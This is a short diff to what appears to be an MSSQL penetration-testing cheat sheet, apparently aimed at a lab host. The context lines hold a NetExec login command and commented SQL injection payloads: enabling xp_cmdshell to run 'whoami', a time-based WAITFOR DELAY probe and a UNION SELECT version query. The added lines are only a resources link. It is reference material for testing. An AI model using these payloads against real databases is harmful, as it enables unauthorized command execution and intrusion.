@@ -69,3 +69,7 @@ nxc mssql 10.10.10.52 -u admin -p '' --local-auth -q 'SELECT * FROM master.dbo.s
 #'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami' --
 #'; WAITFOR DELAY '0:0:5' --
 #' UNION SELECT @@version --
+#
+# 
+# ---------------------------------------------------------------------- resources
+# https://learn.microsoft.com/en-us/sql/t-sql/language-reference?view=sql-server-ver17
